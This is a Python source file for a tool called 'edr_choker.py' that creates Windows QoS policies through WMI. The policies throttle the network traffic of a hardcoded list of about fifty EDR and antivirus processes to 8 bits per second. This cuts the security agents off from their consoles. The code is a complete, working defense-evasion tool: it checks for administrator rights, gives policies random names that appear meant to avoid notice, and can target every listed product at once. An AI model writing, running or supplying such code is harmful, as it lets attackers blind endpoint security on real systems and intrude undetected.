"""
edr_choker.py  —  QoS throttle tool for EDR/AV processes
Requires: pip install wmi
Must be run as Administrator.

Usage:
  # Throttle ALL processes in the hardcoded list
  python edr_choker.py --all

  # Throttle specific processes by index (see --list)
  python edr_choker.py --select 1 3 7

  # Throttle by name directly
  python edr_choker.py --name MsMpEng.exe SentinelAgent.exe

  # Show the numbered list and exit
  python edr_choker.py --list

  # Remove ALL QoS throttle policies
  python edr_choker.py --clear
"""

import sys
import uuid
import random
import string
import ctypes
import argparse

# ── Hardcoded target list ─────────────────────────────────────────────────────

EDR_PROCESSES = [
    "MpDefenderCoreService.exe",
    "MsMpEng.exe",
    "MsSense.exe",
    "SenseIR.exe",
    "SenseNdr.exe",
    "SenseCncProxy.exe",
    "SenseSampleUploader.exe",
    "winlogbeat.exe",
    "elastic-agent.exe",
    "elastic-endpoint.exe",
    "filebeat.exe",
    "xagt.exe",
    "QualysAgent.exe",
    "SentinelAgent.exe",
    "SentinelAgentWorker.exe",
    "SentinelServiceHost.exe",
    "SentinelStaticEngine.exe",
    "LogProcessorService.exe",
    "SentinelStaticEngineScanner.exe",
    "SentinelHelperService.exe",
    "SentinelBrowserNativeHost.exe",
    "CylanceSvc.exe",
    "AmSvc.exe",
    "CrAmTray.exe",
    "CrsSvc.exe",
    "ExecutionPreventionSvc.exe",
    "CybereasonAV.exe",
    "cb.exe",
    "CbDefense.exe",
    "TaniumClient.exe",
    "TaniumCX.exe",
    "TaniumDetectEngine.exe",
    "Traps.exe",
    "cyserver.exe",
    "CyveraService.exe",
    "CyvrFsFlt.exe",
    "fortiedr.exe",
    "sfc.exe",
    "EIConnector.exe",
    "ekrn.exe",
    "hurukai.exe",
    "CETASvc.exe",
    "WSCommunicator.exe",
    "EndpointBasecamp.exe",
    "TmListen.exe",
    "Ntrtscan.exe",
    "TmWSCSvc.exe",
    "PccNTMon.exe",
    "TMBMSRV.exe",
    "CNTAoSMgr.exe",
    "TmCCSF.exe",
]

# ── Helpers ───────────────────────────────────────────────────────────────────

BANNER = r"""
  ___  ___  ___   ___ _           _
 | __|   \|   \ / __| |_  ___  | |_____ _ _
 | _|| |) | |) | (__| ' \/ _ \ | / / -_) '_|
 |___|___/|___/ \___|_||_\___/ |_\_\___|_|
  QoS EDR Throttle Tool
"""

def show_banner():
    print(BANNER)

def is_running_as_admin() -> bool:
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False

def random_policy_name(length: int = 8) -> str:
    chars = string.ascii_lowercase + string.digits
    return "".join(random.choices(chars, k=length))

def print_list():
    """Print the numbered process list."""
    print("\n  Idx  Process")
    print("  ---  " + "-" * 40)
    for i, proc in enumerate(EDR_PROCESSES, start=1):
        print(f"  {i:<4} {proc}")
    print()

# ── WMI operations ────────────────────────────────────────────────────────────

def create_throttle_policy(proc_name: str) -> None:
    try:
        import wmi
        conn = wmi.WMI(namespace=r"root\StandardCimv2")

        policy_guid  = str(uuid.uuid4())
        policy_name  = random_policy_name()
        instance_id  = f"{policy_guid}\\{policy_name}\\ActiveStore"

        new_policy = conn.MSFT_NetQosPolicySettingData.SpawnInstance_()
        new_policy.Owner                     = 1
        new_policy.Name                      = policy_name
        new_policy.InstanceID                = instance_id
        new_policy.AppPathNameMatchCondition = proc_name
        new_policy.IPProtocolMatchCondition  = 3    # Both TCP/UDP
        new_policy.NetworkProfile            = 0    # All profiles
        new_policy.ThrottleRateAction        = 8    # 8 bits/sec

        new_policy.Put_()
        print(f"  [+] THROTTLED  {proc_name:<45} policy={policy_name}")

    except ImportError:
        print("  [!] 'wmi' package not found. Run:  pip install wmi")
        sys.exit(1)
    except Exception as ex:
        print(f"  [-] FAILED     {proc_name:<45} error={ex}")


def remove_all_policies() -> None:
    try:
        import wmi
        conn     = wmi.WMI(namespace=r"root\StandardCimv2")
        policies = conn.MSFT_NetQosPolicySettingData()

        if not policies:
            print("  [i] No QoS policies found.")
            return

        for policy in policies:
            name = getattr(policy, "Name", "Unknown") or "Unknown"
            print(f"  [-] REMOVING   {name}")
            policy.Delete_()
            print(f"  [+] REMOVED    {name}")

    except ImportError:
        print("  [!] 'wmi' package not found. Run:  pip install wmi")
        sys.exit(1)
    except Exception as ex:
        print(f"  [!] Error: {ex}")

# ── CLI ───────────────────────────────────────────────────────────────────────

def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Throttle EDR/AV processes to 8 bits/sec via Windows QoS policy.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )

    group = parser.add_mutually_exclusive_group(required=True)

    group.add_argument(
        "--all",
        action="store_true",
        help="Throttle every process in the hardcoded list.",
    )
    group.add_argument(
        "--select",
        metavar="IDX",
        nargs="+",
        type=int,
        help="Throttle processes by 1-based index (see --list). E.g. --select 1 3 7",
    )
    group.add_argument(
        "--name",
        metavar="PROC",
        nargs="+",
        help="Throttle by exact process name(s). E.g. --name MsMpEng.exe SentinelAgent.exe",
    )
    group.add_argument(
        "--list",
        action="store_true",
        help="Print the numbered process list and exit.",
    )
    group.add_argument(
        "--clear",
        action="store_true",
        help="Remove ALL QoS throttle policies from the system.",
    )

    return parser


def resolve_targets(args) -> list[str]:
    """Return the final list of process names to throttle."""
    if args.all:
        return list(EDR_PROCESSES)

    if args.select:
        targets = []
        for idx in args.select:
            if 1 <= idx <= len(EDR_PROCESSES):
                targets.append(EDR_PROCESSES[idx - 1])
            else:
                print(f"  [!] Index {idx} out of range (1–{len(EDR_PROCESSES)}), skipping.")
        return targets

    if args.name:
        # Case-insensitive match against the list; fall back to raw name if not found
        known = {p.lower(): p for p in EDR_PROCESSES}
        resolved = []
        for n in args.name:
            canonical = known.get(n.lower(), n)   # use canonical casing if known
            resolved.append(canonical)
        return resolved

    return []


def main():
    show_banner()
    parser = build_parser()
    args   = parser.parse_args()

    # --list doesn't need admin
    if args.list:
        print_list()
        return

    if not is_running_as_admin():
        print("  [!] ERROR: Must be run as Administrator.\n")
        sys.exit(1)

    if args.clear:
        print("  [*] Clearing all QoS policies...\n")
        remove_all_policies()
        return

    targets = resolve_targets(args)
    if not targets:
        print("  [!] No valid targets resolved. Use --list to browse available processes.")
        sys.exit(1)

    print(f"  [*] Throttling {len(targets)} process(es)...\n")
    for proc in targets:
        create_throttle_policy(proc)

    print(f"\n  [*] Done. {len(targets)} policy/policies applied.")


if __name__ == "__main__":
    main()
